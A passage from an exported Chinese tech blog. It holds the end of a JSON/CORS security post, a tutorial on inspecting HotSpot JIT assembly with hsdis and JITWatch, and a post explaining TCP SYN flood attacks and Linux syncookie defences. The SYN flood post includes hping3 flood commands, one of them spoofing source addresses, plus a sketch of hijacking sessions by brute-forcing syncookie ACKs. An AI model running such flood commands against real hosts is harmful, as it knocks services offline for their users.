<h3 id="CORS（Cross-Origin-Resource-Sharing）"><a href="#CORS（Cross-Origin-Resource-Sharing）" class="headerlink" title="CORS（Cross-Origin Resource Sharing）"></a>CORS（Cross-Origin Resource Sharing）</h3><p>为了解决跨域调用的安全性问题，目前实际上可用的方案是CORS：</p>
<p><a href="https://developer.mozilla.org/en-US/docs/Web/HTTP/Access_control_CORS" target="_blank" rel="noopener">https://developer.mozilla.org/en-US/docs/Web/HTTP/Access_control_CORS</a><br><a href="http://www.w3.org/TR/cors/" target="_blank" rel="noopener">http://www.w3.org/TR/cors/</a></p>
<p>原理是通过服务器端设置允许跨域调用，然后浏览器就允许XMLHttpRequest跨域调用了。</p>
<p>CORS可以发起GET/POST请求，不像JSONP，只能发起GET请求。</p>
<p><strong>默认情况下，CORS请求是不带cookie的。</strong></p>
<p>我个人认为，这个方案也很蛋疼，一是需要服务器配置，二是协议复杂。浏览器如果不能确定是否能够跨域调用，还要先进行一个Preflight Request。。</p>
<p><strong>实际上，即使服务器不允许CORS，XMLHttpRequest请求实际上是发送出去，并且返回数据的了，只是浏览器没有让JS环境拿到而已。</strong></p>
<p>另外，我认为有另外一种数据泄露的可能：黑客可能控制了某个路由，他不能随意抓包，但是他可以在回应头里插入一些特别的头部，比如：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Access-Control-Allow-Credentials: true</span><br></pre></td></tr></table></figure>
<p>那么，这时XMLHttpRequest请求就是带cookie的了。</p>
<h2 id="最初的问题"><a href="#最初的问题" class="headerlink" title="最初的问题"></a>最初的问题</h2><p>回到最初的问题：</p>
<ul>
<li><p>为什么XMLHttpRequest要遵守同源策略？</p>
<p>  即使XMLHttpRequest是不带Cookie的，也是有可能造成数据泄露的。比如内部网站是根据IP限制访问的，如果XMLHttpRequest不遵守同源策略，那么攻击者可以在用户浏览网页的时候，发起请求，取得内部网站数据。</p>
</li>
<li><p>XMLHttpRequest 请求会不会带cookie?</p>
<p>  同域情况下会，不同域情况下不会。如果服务器设置Access-Control-Allow-Credentials: true ，也是可以跨域带Cookie的。</p>
</li>
<li><p><code>&lt;script scr=&quot;...&quot;&gt;</code> 的标签请求会不会带cookie？</p>
<p>  会。</p>
</li>
<li><p>向一个其它域名的网站提交一个form，会不会带cookie？</p>
<p>  会。</p>
</li>
</ul>
<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><ul>
<li>禁止手动拼接JSON字符串，一律应当用JSON库输出。也不应使用自己实现的ObjectToJson等方法，因为可能有各种没有考虑到的地方。</li>
<li>jsonp请求的callback要严格过滤，只允许”_”，0到9，a-z, A-Z，即合法的javascript函数的命名。</li>
<li>jsonp请求也要判断合法性，比如用户是否登陆（这点很容易被忽略）。</li>
<li>设置好Content-Type（这点对于调试不方便，但是提高了安全性）。</li>
<li>以jsonp方式调用第三方的接口，实际相当于引入了第三方的JS代码，要慎重。</li>
</ul>
<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><ul>
<li><a href="http://www.json.org/" target="_blank" rel="noopener">http://www.json.org/</a></li>
<li><a href="http://www.slideshare.net/wurbanski/nosql-no-security" target="_blank" rel="noopener">http://www.slideshare.net/wurbanski/nosql-no-security</a></li>
<li><a href="https://github.com/douglascrockford/JSON-js" target="_blank" rel="noopener">https://github.com/douglascrockford/JSON-js</a></li>
<li><a href="http://toolswebtop.com/" target="_blank" rel="noopener">http://toolswebtop.com/</a>      在线编码转换，可以转换UTF-7    </li>
<li><a href="http://www.thespanner.co.uk/2011/05/30/json-hijacking/" target="_blank" rel="noopener">http://www.thespanner.co.uk/2011/05/30/json-hijacking/</a></li>
<li><a href="http://www.thespanner.co.uk/2009/11/23/bypassing-csp-for-fun-no-profit/" target="_blank" rel="noopener">http://www.thespanner.co.uk/2009/11/23/bypassing-csp-for-fun-no-profit/</a></li>
<li><a href="http://stackoverflow.com/questions/1830050/why-same-origin-policy-for-xmlhttprequest" target="_blank" rel="noopener">http://stackoverflow.com/questions/1830050/why-same-origin-policy-for-xmlhttprequest</a></li>
</ul>
]]></content>
      <categories>
        <category>技术</category>
      </categories>
      <tags>
        <tag>security</tag>
        <tag>javascript</tag>
        <tag>web</tag>
        <tag>json</tag>
      </tags>
  </entry>
  <entry>
    <title>利用hsdis和JITWatch查看分析HotSpot JIT compiler生成的汇编代码</title>
    <url>/jvm-hsdis-jitwatch/</url>
    <content><![CDATA[<h2 id="安装hsdis"><a href="#安装hsdis" class="headerlink" title="安装hsdis"></a>安装hsdis</h2><p>要查看JIT生成的汇编代码，要先装一个反汇编器：hsdis。从名字来看，即HotSpot disassembler。</p>
<p>实际就是一个动态链接库。网络上有已经编绎好的文件，直接下载即可。</p>
<p>国内的：<a href="http://hllvm.group.iteye.com/" target="_blank" rel="noopener">http://hllvm.group.iteye.com/</a></p>
<p>也可以自己编绎，只是编绎hsdis，还是比较快的。</p>
<p>参考这里：<a href="http://www.chrisnewland.com/building-hsdis-on-linux-amd64-on-debian-369" target="_blank" rel="noopener">http://www.chrisnewland.com/building-hsdis-on-linux-amd64-on-debian-369</a></p>
<p>官方的参考文档：</p>
<p><a href="https://wikis.oracle.com/display/HotSpotInternals/PrintAssembly" target="_blank" rel="noopener">https://wikis.oracle.com/display/HotSpotInternals/PrintAssembly</a></p>
<p>简而言之，安装只要把下载到，或者编绎好的so文件放到对应的Java安装路径下即可。</p>
<p>典型的情况是把下载到的 hsdis-amd64.so 放到 /usr/lib/jvm/java-7-oracle/jre/lib/amd64/ 目录下。</p>
<p>可以用下面这个命令来查看是否安装成功。</p>
<p>java -XX:+UnlockDiagnosticVMOptions -XX:+PrintAssembly -version</p>
<p>如果输出有：</p>
<p>Java HotSpot(TM) 64-Bit Server VM warning: PrintAssembly is enabled</p>
<p>则安装成功。</p>
<h2 id="安装JITWatch"><a href="#安装JITWatch" class="headerlink" title="安装JITWatch"></a>安装JITWatch</h2><p>hsdis自然是很重要，但是今天的主角是JITWatch，一个分析展现JIT日志等的图形界面工具，非常的好用。</p>
<p><a href="https://github.com/AdoptOpenJDK/jitwatch" target="_blank" rel="noopener">https://github.com/AdoptOpenJDK/jitwatch</a></p>
<p>首先下载jar包，这里下载的是JDK7版本的：</p>
<p>wget <a href="https://adopt-openjdk.ci.cloudbees.com/job/jitwatch/jdk=JDK_1.7/ws/jitwatch-1.0.0-SNAPSHOT-JDK_1.7.tar.gz" target="_blank" rel="noopener">https://adopt-openjdk.ci.cloudbees.com/job/jitwatch/jdk=JDK_1.7/ws/jitwatch-1.0.0-SNAPSHOT-JDK_1.7.tar.gz</a></p>
<p>解压得到jar 文件。</p>
<p>下载代码文件，主要是为了相关的依赖jar：</p>
<p>wget  <a href="https://github.com/AdoptOpenJDK/jitwatch/archive/master.zip" target="_blank" rel="noopener">https://github.com/AdoptOpenJDK/jitwatch/archive/master.zip</a></p>
<p>解压，从lib目录得到相关的jar包。和前面得到的JITWatch的jar包放在一起。</p>
<p>用这个命令启动：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">java -cp /usr/lib/jvm/java-7-oracle/lib/tools.jar:/usr/lib/jvm/java-7-oracle/jre/lib/jfxrt.jar:jitwatch-1.0.0-SNAPSHOT.jar:slf4j-api-1.7.7.jar:hamcrest-core-1.3.jar:logback-classic-1.1.2.jar:logback-core-1.1.2.jar com.chrisnewland.jitwatch.launch.LaunchUI</span><br></pre></td></tr></table></figure>
<p>启动后显示的界面如下，左上方有一个sanbox的按钮，点击会在当前目录下生成一个sanbox文件夹，里面存放着sanbox这个示例相关的代码。</p>
<p><img src="/img/jitwatch.png" alt></p>
<p>点击sanbox就可以随便尝试下功能了。</p>
<h2 id="生成JIT-log文件"><a href="#生成JIT-log文件" class="headerlink" title="生成JIT log文件"></a>生成JIT log文件</h2><p><strong>首先要写一个足够复杂的类，让JIT编绎器认为它需要进行优化，不然产生的日志可能没什么内容。</strong>我在这里被坑了不少时间，怎么死活都没有日志。。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Test</span> </span>&#123;</span><br><span class="line">	<span class="keyword">public</span> <span class="keyword">volatile</span> <span class="keyword">long</span> sum = <span class="number">0</span>;</span><br><span class="line">	</span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">add</span><span class="params">(<span class="keyword">int</span> a, <span class="keyword">int</span> b)</span> </span>&#123;</span><br><span class="line">		<span class="keyword">int</span> temp = a + b;</span><br><span class="line">		sum += temp;</span><br><span class="line">		<span class="keyword">return</span> temp;</span><br><span class="line">	&#125;</span><br><span class="line"> </span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">		Test test = <span class="keyword">new</span> Test();</span><br><span class="line"> </span><br><span class="line">		<span class="keyword">int</span> sum = <span class="number">0</span>;</span><br><span class="line"> </span><br><span class="line">		<span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">1000000</span>; i++) &#123;</span><br><span class="line">			sum = test.add(sum, <span class="number">1</span>);</span><br><span class="line">		&#125;</span><br><span class="line"> </span><br><span class="line">		System.out.println(<span class="string">"Sum:"</span> + sum);</span><br><span class="line">		System.out.println(<span class="string">"Test.sum:"</span> + test.sum);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>加上一些参数来执行程序，就可以直接生成JIT log文件了，比如为Test类生成：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">javac Test.java</span><br><span class="line">java -server -XX:+UnlockDiagnosticVMOptions -XX:+TraceClassLoading  -XX:+PrintAssembly -XX:+LogCompilation -XX:LogFile=live.log  Test</span><br></pre></td></tr></table></figure>
<p>注意生成的log文件里，可能会有一些class path相关的东东，所以JITWatch有可能会解析失败。这时注意看左下的“Errors”。</p>
<p>个人推荐在Eclipse里配置生成JIT log，这样使用起来更方便。</p>
<p>在“Run Configuration”里配置上JVM参数：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">-server -XX:+UnlockDiagnosticVMOptions -XX:+TraceClassLoading  -XX:+PrintAssembly -XX:+LogCompilation -XX:LogFile=$&#123;java_type_name&#125;.log</span><br></pre></td></tr></table></figure>
<p>然后，当执行时，会自动生成JIT log。</p>
<p>在JITWatch里，“Open Log”，打开生成的Test.log，然后配置config：</p>
<p><img src="/img/jitwatch-config.png" alt></p>
<p>然后，点”Start”就可以查看到分析的结果了。</p>
<p>这是一个分析结果的展示，左边是源代码，中间是ByteCode，右边是汇编代码：</p>
<p><img src="/img/jitwatch-result.png" alt></p>
<p>JITWatch还有很多强大的功能。具体请参考wiki：</p>
<p><a href="https://github.com/AdoptOpenJDK/jitwatch/wiki" target="_blank" rel="noopener">https://github.com/AdoptOpenJDK/jitwatch/wiki</a></p>
<p>比如查看函数是否inline，循环展开，分支预测等。</p>
<p>作者有一个PDF介绍：</p>
<p><a href="http://www.chrisnewland.com/images/jitwatch/HotSpot_Profiling_Using_JITWatch.pdf" target="_blank" rel="noopener">http://www.chrisnewland.com/images/jitwatch/HotSpot_Profiling_Using_JITWatch.pdf</a></p>
<p>视频：</p>
<p><a href="https://skillsmatter.com/skillscasts/5243-chris-newland-hotspot-profiling-with-jit-watch" target="_blank" rel="noopener">https://skillsmatter.com/skillscasts/5243-chris-newland-hotspot-profiling-with-jit-watch</a></p>
<h2 id="Java里volatile的实现"><a href="#Java里volatile的实现" class="headerlink" title="Java里volatile的实现"></a>Java里volatile的实现</h2><p>从生成的汇编代码，可以看出Java里volatile的实现是用lock指令前缀来实现的：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">0x00007f80950601b0: lock addl $0x0,(%rsp)  ;*putfield sum</span><br><span class="line">                                           ; - Test::add@12 (line 6)</span><br><span class="line">                                           ; - Test::main@18 (line 16)</span><br></pre></td></tr></table></figure>
<p>更加关于lock指令前缀，请参考这里：<br><a href="http://stackoverflow.com/questions/8891067/what-does-the-lock-instruction-mean-in-x86-assembly" target="_blank" rel="noopener">http://stackoverflow.com/questions/8891067/what-does-the-lock-instruction-mean-in-x86-assembly</a></p>
<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><ul>
<li><a href="http://psy-lob-saw.blogspot.com/2013/01/java-print-assembly.html" target="_blank" rel="noopener">http://psy-lob-saw.blogspot.com/2013/01/java-print-assembly.html</a></li>
<li><a href="http://www.chrisnewland.com/images/jitwatch/HotSpot_Profiling_Using_JITWatch.pdf" target="_blank" rel="noopener">http://www.chrisnewland.com/images/jitwatch/HotSpot_Profiling_Using_JITWatch.pdf</a></li>
</ul>
]]></content>
      <categories>
        <category>技术</category>
      </categories>
      <tags>
        <tag>java</tag>
        <tag>jvm</tag>
        <tag>hsdis</tag>
        <tag>hotspot</tag>
      </tags>
  </entry>
  <entry>
    <title>扯谈网络编程之Tcp SYN flood洪水攻击</title>
    <url>/tcp-syn-flood/</url>
    <content><![CDATA[<p>update 2017-5-11: syncookies 会点用 tcp_options 字段空间，会强制关闭 tcp 高级流控技术而退化成原始 tcp 模式。此模式会导致 封包 丢失时对端要等待MSL时间来发现丢包事件并重试，以及关闭连接时 TIME_WAIT 状态保持 2MSL 时间。</p>
<h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>TCP协议要经过三次握手才能建立连接(from wiki)：</p>
<p><img src="/img/tcp-syn.png" alt="tcp"></p>
<p>于是出现了对于握手过程进行的攻击。攻击者发送大量的SYN包，服务器回应(SYN+ACK)包，但是攻击者不回应ACK包，这样的话，服务器不知道(SYN+ACK)是否发送成功，默认情况下会重试5次（tcp_syn_retries）。这样的话，对于服务器的内存，带宽都有很大的消耗。攻击者如果处于公网，可以伪造IP的话，对于服务器就很难根据IP来判断攻击者，给防护带来很大的困难。</p>
<h2 id="攻与防"><a href="#攻与防" class="headerlink" title="攻与防"></a>攻与防</h2><h3 id="攻击者角度"><a href="#攻击者角度" class="headerlink" title="攻击者角度"></a>攻击者角度</h3><p>从攻击者的角度来看，有两个地方可以提高服务器防御的难度的：</p>
<ul>
<li>变换端口</li>
<li>伪造IP</li>
</ul>
<p>变换端口很容易做到，攻击者可以使用任意端口。</p>
<p>攻击者如果是只有内网IP，是没办法伪造IP的，因为伪造的SYN包会被路由抛弃。攻击者如果是有公网IP，则有可能伪造IP，发出SYN包。（TODO，待更多验证）</p>
<h3 id="hping3"><a href="#hping3" class="headerlink" title="hping3"></a>hping3</h3><p>hping3是一个很有名的网络安全工具，使用它可以很容易构造各种协议包。</p>
<p>用下面的命令可以很容易就发起SYN攻击：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo hping3 --flood -S -p 9999  x.x.x.x</span><br><span class="line"><span class="comment">#random source address</span></span><br><span class="line">sudo hping3 --flood -S --rand-source -p 9999  x.x.x.x</span><br></pre></td></tr></table></figure>
<ul>
<li>–flood 是不间断发包的意思</li>
<li>-S         是SYN包的意思</li>
</ul>
<p>更多的选项，可以man hping3 查看文档，有详细的说明。</p>
<p>如果是条件允许，可以伪造IP地址的话，可以用–rand-source参数来伪造。<br>我在实际测试的过程中，可以伪造IP，也可以发送出去，但是服务器没有回应，从本地路由器的统计数据可以看出是路由器把包给丢弃掉了。</p>
<p>我用两个美国的主机来测试，使用</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo hping3 --flood -S  -p 9999  x.x.x.x</span><br></pre></td></tr></table></figure>
<p><img src="/img/hping3.png" alt="hping3"></p>
<p>发现，实际上攻击效果有限，只有网络使用上涨了，服务器的cpu，内存使用都没有什么变化：</p>
<p>为什么会这样呢？下面再解析。</p>
<h3 id="防御者角度"><a href="#防御者角度" class="headerlink" title="防御者角度"></a>防御者角度</h3><p>当可能遇到SYN flood攻击时，syslog，/var/log/syslog里可能会出现下面的日志：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">kernel: [3649830.269068] TCP: Possible SYN flooding on port 9999. Sending cookies.  Check SNMP counters.</span><br></pre></td></tr></table></figure>
<p>这个也有可能是SNMP协议误报，下面再解析。</p>
<p>从防御者的角度来看，主要有以下的措施：</p>
<ul>
<li>内核参数的调优</li>
<li>防火墙禁止掉部分IP</li>
</ul>
<p>linux内核参数调优主要有下面三个：</p>
<ul>
<li>增大tcp_max_syn_backlog</li>
<li>减小tcp_synack_retries</li>
<li>启用tcp_syncookies</li>
</ul>
<h4 id="tcp-max-syn-backlog"><a href="#tcp-max-syn-backlog" class="headerlink" title="tcp_max_syn_backlog"></a>tcp_max_syn_backlog</h4><p>从字面上就可以推断出是什么意思。在内核里有个队列用来存放还没有确认ACK的客户端请求，当等待的请求数大于tcp_max_syn_backlog时，后面的会被丢弃。</p>
<p>所以，适当增大这个值，可以在压力大的时候提高握手的成功率。手册里推荐大于1024。</p>
<h4 id="tcp-synack-retries"><a href="#tcp-synack-retries" class="headerlink" title="tcp_synack_retries"></a>tcp_synack_retries</h4><p>这个是三次握手中，服务器回应ACK给客户端里，重试的次数。默认是5。显然攻击者是不会完成整个三次握手的，因此服务器在发出的ACK包在没有回应的情况下，会重试发送。当发送者是伪造IP时，服务器的ACK回应自然是无效的。</p>
<p>为了防止服务器做这种无用功，可以把tcp_synack_retries设置为0或者1。因为对于正常的客户端，如果它接收不到服务器回应的ACK包，它会再次发送SYN包，客户端还是能正常连接的，只是可能在某些情况下建立连接的速度变慢了一点。</p>
<h4 id="tcp-syncookies"><a href="#tcp-syncookies" class="headerlink" title="tcp_syncookies"></a>tcp_syncookies</h4><p>根据man tcp手册，tcp_syncookies是这样解析的：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">tcp_syncookies (Boolean; since Linux 2.2)</span><br><span class="line">       Enable TCP syncookies.  The kernel must be compiled with CONFIG_SYN_COOKIES.  Send out syncookies  when  the</span><br><span class="line">       syn  backlog  queue  of  a socket overflows.  The syncookies feature attempts to protect a socket from a SYN</span><br><span class="line">       flood attack.  This should be used as a last resort, if at all.  This is a violation of  the  TCP  protocol,</span><br><span class="line">       and conflicts with other areas of TCP such as TCP extensions.  It can cause problems for clients and relays.</span><br><span class="line">       It is not recommended as a tuning mechanism for heavily loaded servers to help with overloaded or misconfig‐</span><br><span class="line">       ured   conditions.    For   recommended   alternatives   see  tcp_max_syn_backlog,  tcp_synack_retries,  and</span><br><span class="line">       tcp_abort_on_overflow.</span><br></pre></td></tr></table></figure>
<p>当半连接的请求数量超过了tcp_max_syn_backlog时，内核就会启用SYN cookie机制，不再把半连接请求放到队列里，而是用SYN cookie来检验。</p>
<p>手册上只给出了模糊的说明，具体的实现没有提到。</p>
<h3 id="linux下SYN-cookie的实现"><a href="#linux下SYN-cookie的实现" class="headerlink" title="linux下SYN cookie的实现"></a>linux下SYN cookie的实现</h3><p>查看了linux的代码（<a href="https://github.com/torvalds/linux/blob/master/net/ipv4/syncookies.c" target="_blank" rel="noopener">https://github.com/torvalds/linux/blob/master/net/ipv4/syncookies.c</a> ）后，发现linux的实现并不是像wiki上</p>
<p>SYN cookie是非常巧妙地利用了TCP规范来绕过了TCP连接建立过程的验证过程，从而让服务器的负载可以大大降低。</p>
<p>在三次握手中，当服务器回应（SYN + ACK）包后，客户端要回应一个n + 1的ACK到服务器。其中n是服务器自己指定的。当启用tcp_syncookies时，linux内核生成一个特定的n值，而不并把客户的连接放到半连接的队列里（即没有存储任何关于这个连接的信息）。当客户端提交第三次握手的ACK包时，linux内核取出n值，进行校验，如果通过，则认为这个是一个合法的连接。</p>
<p>n即ISN（initial sequence number），是一个无符号的32位整数，<strong>那么linux内核是如何把信息记录到这有限的32位里，并完成校验的？</strong></p>
<p>首先，TCP连接建立时，双方要协商好MSS（Maximum segment size），服务器要把客户端在ACK包里发过来的MSS值记录下来。</p>
<p>另外，因为服务器没有记录ACK包的任何信息，实际上是绕过了正常的TCP握手的过程，服务器只能靠客户端的第三次握手发过来的ACK包来验证，所以必须要有一个可靠的校验算法，防止攻击者伪造ACK，劫持会话。</p>
<p>linux是这样实现的：</p>
<ol>
<li>在服务器上有一个60秒的计时器，即每隔60秒，count加一；</li>
<li>MSS是这样子保存起来的，用一个硬编码的数组，保存起一些MSS值：</li>
</ol>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="keyword">static</span> __u16 <span class="keyword">const</span> msstab[] = &#123;</span><br><span class="line">	<span class="number">536</span>,</span><br><span class="line">	<span class="number">1300</span>,</span><br><span class="line">	<span class="number">1440</span>,	<span class="comment">/* 1440, 1452: PPPoE */</span></span><br><span class="line">	<span class="number">1460</span>,</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<p>比较客户发过来的mms，取一个比客户发过来的值还要小的mms。算法很简单：</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * Generate a syncookie.  mssp points to the mss, which is returned</span></span><br><span class="line"><span class="comment"> * rounded down to the value encoded in the cookie.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">u32 __cookie_v4_init_sequence(<span class="keyword">const</span> struct iphdr *iph, <span class="keyword">const</span> struct tcphdr *th,</span><br><span class="line">			      u16 *mssp)</span><br><span class="line">&#123;</span><br><span class="line">	<span class="keyword">int</span> mssind;</span><br><span class="line">	<span class="keyword">const</span> __u16 mss = *mssp;</span><br><span class="line"> </span><br><span class="line">	<span class="keyword">for</span> (mssind = ARRAY_SIZE(msstab) - <span class="number">1</span>; mssind ; mssind--)</span><br><span class="line">		<span class="keyword">if</span> (mss &gt;= msstab[mssind])</span><br><span class="line">			<span class="keyword">break</span>;</span><br><span class="line">	*mssp = msstab[mssind];</span><br><span class="line"> </span><br><span class="line">	<span class="keyword">return</span> secure_tcp_syn_cookie(iph-&gt;saddr, iph-&gt;daddr,</span><br><span class="line">				     th-&gt;source, th-&gt;dest, ntohl(th-&gt;seq),</span><br><span class="line">				     mssind);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>比较客户发过来的mms，取一个比客户发过来的值还要小的mms。</p>
<p>真正的算法在这个函数里：</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> __u32 <span class="title">secure_tcp_syn_cookie</span><span class="params">(__be32 saddr, __be32 daddr, __be16 sport,</span></span></span><br><span class="line"><span class="function"><span class="params">				   __be16 dport, __u32 sseq, __u32 data)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="comment">/*</span></span><br><span class="line"><span class="comment">	 * Compute the secure sequence number.</span></span><br><span class="line"><span class="comment">	 * The output should be:</span></span><br><span class="line"><span class="comment">	 *   HASH(sec1,saddr,sport,daddr,dport,sec1) + sseq + (count * 2^24)</span></span><br><span class="line"><span class="comment">	 *      + (HASH(sec2,saddr,sport,daddr,dport,count,sec2) % 2^24).</span></span><br><span class="line"><span class="comment">	 * Where sseq is their sequence number and count increases every</span></span><br><span class="line"><span class="comment">	 * minute by 1.</span></span><br><span class="line"><span class="comment">	 * As an extra hack, we add a small "data" value that encodes the</span></span><br><span class="line"><span class="comment">	 * MSS into the second hash value.</span></span><br><span class="line"><span class="comment">	 */</span></span><br><span class="line">	u32 count = tcp_cookie_time();</span><br><span class="line">	<span class="keyword">return</span> (cookie_hash(saddr, daddr, sport, dport, <span class="number">0</span>, <span class="number">0</span>) +</span><br><span class="line">		sseq + (count &lt;&lt; COOKIEBITS) +</span><br><span class="line">		((cookie_hash(saddr, daddr, sport, dport, count, <span class="number">1</span>) + data)</span><br><span class="line">		 &amp; COOKIEMASK));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>data实际上是mss的值对应的数组下标，count是每一分钟会加1，sseq是客户端发过来的sequence。</p>
<p>这样经过hash和一些加法，得到了一个ISN值，其中里记录了这个连接合适的MSS值。</p>
<p>当接收到客户端发过来的第三次握手的ACK包时，反向检查即可：</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * Check if a ack sequence number is a valid syncookie.</span></span><br><span class="line"><span class="comment"> * Return the decoded mss if it is, or 0 if not.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">int</span> __cookie_v4_check(<span class="keyword">const</span> struct iphdr *iph, <span class="keyword">const</span> struct tcphdr *th,</span><br><span class="line">		      u32 cookie)</span><br><span class="line">&#123;</span><br><span class="line">	__u32 seq = ntohl(th-&gt;seq) - <span class="number">1</span>;</span><br><span class="line">	__u32 mssind = check_tcp_syn_cookie(cookie, iph-&gt;saddr, iph-&gt;daddr,</span><br><span class="line">					    th-&gt;source, th-&gt;dest, seq);</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">	<span class="keyword">return</span> mssind &lt; ARRAY_SIZE(msstab) ? msstab[mssind] : <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>先得到原来的seq，再调用check_tcp_syn_cookie函数：</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * This retrieves the small "data" value from the syncookie.</span></span><br><span class="line"><span class="comment"> * If the syncookie is bad, the data returned will be out of</span></span><br><span class="line"><span class="comment"> * range.  This must be checked by the caller.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * The count value used to generate the cookie must be less than</span></span><br><span class="line"><span class="comment"> * MAX_SYNCOOKIE_AGE minutes in the past.</span></span><br><span class="line"><span class="comment"> * The return value (__u32)-1 if this test fails.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">static</span> __u32 <span class="title">check_tcp_syn_cookie</span><span class="params">(__u32 cookie, __be32 saddr, __be32 daddr,</span></span></span><br><span class="line"><span class="function"><span class="params">				  __be16 sport, __be16 dport, __u32 sseq)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	u32 diff, count = tcp_cookie_time();</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">	<span class="comment">/* Strip away the layers from the cookie */</span></span><br><span class="line">	cookie -= cookie_hash(saddr, daddr, sport, dport, <span class="number">0</span>, <span class="number">0</span>) + sseq;</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">	<span class="comment">/* Cookie is now reduced to (count * 2^24) ^ (hash % 2^24) */</span></span><br><span class="line">	diff = (count - (cookie &gt;&gt; COOKIEBITS)) &amp; ((__u32) <span class="number">-1</span> &gt;&gt; COOKIEBITS);</span><br><span class="line">	<span class="keyword">if</span> (diff &gt;= MAX_SYNCOOKIE_AGE)</span><br><span class="line">		<span class="keyword">return</span> (__u32)<span class="number">-1</span>;</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">	<span class="keyword">return</span> (cookie -</span><br><span class="line">		cookie_hash(saddr, daddr, sport, dport, count - diff, <span class="number">1</span>))</span><br><span class="line">		&amp; COOKIEMASK;	<span class="comment">/* Leaving the data behind */</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>先减去之前的一些值，第一个hash和sseq。然后计算现在的count（每60秒加1的计数器）和之前的发给客户端，然后客户端返回过来的count的差：<br>如果大于MAX_SYNCOOKIE_AGE，即2，即2分钟。则说明已经超时了。</p>
<p>否则，计算得出之前放进去的mss。这样内核就认为这个是一个合法的TCP连接，并且得到了一个合适的mss值，这样就建立起了一个合法的TCP连接。<br>可以看到SYN cookie机制十分巧妙地不用任何存储，以略消耗CPU实现了对第三次握手的校验。</p>
<p>但是有得必有失，ISN里只存储了MSS值，因此，其它的TCP Option都不会生效，这就是为什么SNMP协议会误报的原因了。</p>
<h3 id="更强大的攻击者"><a href="#更强大的攻击者" class="headerlink" title="更强大的攻击者"></a>更强大的攻击者</h3><p>SYN cookie虽然十分巧妙，但是也给攻击者带了新的攻击思路。</p>
<p>因为SYN cookie机制不是正常的TCP三次握手。因此攻击者可以构造一个第三次握手的ACK包，从而劫持会话。</p>
<p>攻击者的思路很简单，通过暴力发送大量的伪造的第三次握手的ACK包，因为ISN只有32位，攻击者只要发送全部的ISN数据ACK包，总会有一个可以通过服务器端的校验。</p>
<p>有的人就会问了，即使攻击者成功通过了服务器的检验，它还是没有办法和服务器正常通讯啊，因为服务器回应的包都不会发给攻击者。</p>
<p>刚开始时，我也有这个疑问，但是TCP允许在第三次握手的ACK包里带上后面请求的数据，这样可以加快数据的传输。所以，比如一个http服务器，攻击者可以通过在第三次握手的ACK包里带上http get/post请求，从而完成攻击。</p>
<p>所以对于服务器而言，不能只是依靠IP来校验合法的请求，还要通过其它的一些方法来加强校验。比如CSRF等。</p>
<p><strong>值得提醒的是即使是正常的TCP三次握手过程，攻击者还是可以进行会话劫持的，只是概率比SYN cookie的情况下要小很多。</strong></p>
<p>详细的攻击说明：<a href="http://www.91ri.org/7075.html" target="_blank" rel="noopener">http://www.91ri.org/7075.html</a></p>
<h3 id="一个用raw-socket-SYN-flood攻击的代码"><a href="#一个用raw-socket-SYN-flood攻击的代码" class="headerlink" title="一个用raw socket SYN flood攻击的代码"></a>一个用raw socket SYN flood攻击的代码</h3><p>下面给出一个tcp syn flood的攻击的代码：</p>
